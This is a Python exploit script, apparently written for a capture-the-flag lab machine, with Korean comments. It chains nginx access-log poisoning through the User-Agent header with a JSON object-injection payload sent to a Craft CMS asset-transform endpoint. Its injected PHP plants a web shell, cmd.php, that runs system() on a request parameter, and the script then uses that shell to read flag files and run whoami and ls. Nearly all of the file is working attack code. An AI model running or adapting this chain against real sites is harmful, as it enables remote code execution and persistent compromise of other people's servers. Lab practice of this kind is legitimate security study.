#!/usr/bin/env python3
import socket, sys, re, json, time
import requests, urllib3

urllib3.disable_warnings()
TARGET_IP = "10.129.244.146"
_orig = socket.getaddrinfo
def p(h, *a, **kw):
    return _orig(TARGET_IP if h == "orion.htb" else h, *a, **kw)
socket.getaddrinfo = p

TARGET = "http://orion.htb"
s = requests.Session()
s.verify = False

def poison_and_trigger(php_code):
    """PHP 코드를 access.log에 poisoning하고 trigger"""
    csrf_r = s.get(f"{TARGET}/actions/users/session-info", headers={"Accept": "application/json"})
    csrf = csrf_r.json()["csrfTokenValue"]

    s.get(f"{TARGET}/", headers={"User-Agent": php_code})
    time.sleep(0.2)

    payload = {
        "assetId": 2,
        "handle": {"width": 1, "height": 1,
            "as hack": {
                "class": "craft\\behaviors\\FieldLayoutBehavior",
                "__class": "yii\\rbac\\PhpManager",
                "__construct()": [{"itemFile": "/var/log/nginx/access.log"}],
            },
        },
    }
    r = s.post(f"{TARGET}/actions/assets/generate-transform",
               data=json.dumps(payload),
               headers={"Content-Type": "application/json", "X-CSRF-Token": csrf})
    return r.status_code, r.text

# Step 1: Web shell 작성 (한 줄로)
shell_code = "<?php file_put_contents('/var/www/html/cmd.php', '<?php system(\$_GET[\"c\"]); ?>'); echo 'OK'; exit; ?>"

print("[*] Writing web shell...", file=sys.stderr)
status, resp = poison_and_trigger(shell_code)
print(f"[*] Status: {status}", file=sys.stderr)

time.sleep(0.5)

# Step 2: Web shell 테스트
print("[*] Testing shell...", file=sys.stderr)
r = s.get(f"{TARGET}/cmd.php?c=id")
print(f"[+] Shell response ({r.status_code}): {r.text[:500]}")

# Step 3: 원하는 정보 추출
print("\n[*] Getting flags...", file=sys.stderr)
for cmd in ["cat /var/www/FLAG.txt", "find /home -name 'user.txt' 2>/dev/null", "whoami", "ls /home"]:
    r = s.get(f"{TARGET}/cmd.php", params={"c": cmd})
    print(f"\n=== {cmd} ===")
    print(r.text[:1000])
